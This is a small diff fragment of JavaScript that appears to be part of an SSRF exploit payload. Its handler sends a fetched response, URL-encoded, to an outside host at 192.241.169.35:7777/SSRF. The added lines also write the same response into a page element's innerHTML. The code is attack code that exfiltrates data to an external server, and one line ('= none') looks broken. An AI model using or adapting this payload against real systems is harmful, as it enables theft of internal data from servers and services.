@@ -16,6 +16,8 @@ function handler() {
       xhr2.onreadystatechange = none; 
       xhr2.open("GET", 'https://192.241.169.35:7777/SSRF?u='+encodeURIComponent(this.responseText), true);
       xhr2.send();
+      
+      out.innerHTML += this.responseText;
 }
   } else {
     // something went wrong
